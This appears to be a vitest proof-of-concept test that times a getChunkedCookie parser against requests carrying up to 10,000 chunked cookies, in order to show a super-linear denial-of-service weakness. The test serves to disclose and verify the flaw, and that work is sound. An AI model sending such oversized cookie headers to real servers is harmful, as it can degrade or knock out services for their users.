import { describe, it, expect, vi } from 'vitest';
import { RequestCookies } from '@edge-runtime/cookies';
import { getChunkedCookie } from './cookies.js';

// Mock console to prevent logging during tests, but we can spy on it.
vi.spyOn(console, 'warn').mockImplementation(() => {});

function createMockRequestCookies(chunkCount: number, cookieName: string): RequestCookies {
  const headers = new Headers();
  const cookieStrings = [];
  for (let i = 0; i < chunkCount; i++) {
    cookieStrings.push(`${cookieName}__${i}=chunk`);
  }
  headers.set('Cookie', cookieStrings.join('; '));
  return new RequestCookies(headers);
}

describe('getChunkedCookie Denial of Service Vulnerability', () => {

  const runTest = (chunkCount: number) => {
    console.log(`\n--- Running test with ${chunkCount} cookie chunks ---`);
    const cookieName = 'appSession';
    const mockCookies = createMockRequestCookies(chunkCount, cookieName);

    const startTime = process.hrtime.bigint();
    getChunkedCookie(cookieName, mockCookies);
    const endTime = process.hrtime.bigint();

    const durationMs = Number(endTime - startTime) / 1_000_000;
    console.log(`Execution time: ${durationMs.toFixed(2)} ms`);
    return durationMs;
  };

  it('should demonstrate high execution time with a large number of chunks', () => {
    const chunkCounts = [100, 1000, 5000, 10000];
    const results: { chunks: number, time: number }[] = [];

    for (const count of chunkCounts) {
      const time = runTest(count);
      results.push({ chunks: count, time });
    }

    console.log('\n--- Summary ---');
    results.forEach(result => {
      console.log(`Chunks: ${result.chunks}, Time: ${result.time.toFixed(2)} ms`);
    });

    // The vulnerability is demonstrated by a super-linear increase in time.
    // We expect the time for 10000 chunks to be significantly more than 10x the time for 1000 chunks.
    const time1k = results.find(r => r.chunks === 1000)!.time;
    const time10k = results.find(r => r.chunks === 10000)!.time;

    console.log(`\nRatio of 10k chunks time to 1k chunks time: ${(time10k / time1k).toFixed(2)}x`);
    console.log('A high ratio and long execution time for 10k chunks confirms the vulnerability.');

    // A simple assertion to confirm the test ran and the vulnerability is likely present.
    // A more stringent test might assert on the execution time, but that can be flaky.
    expect(time10k).toBeGreaterThan(time1k);
  });
});
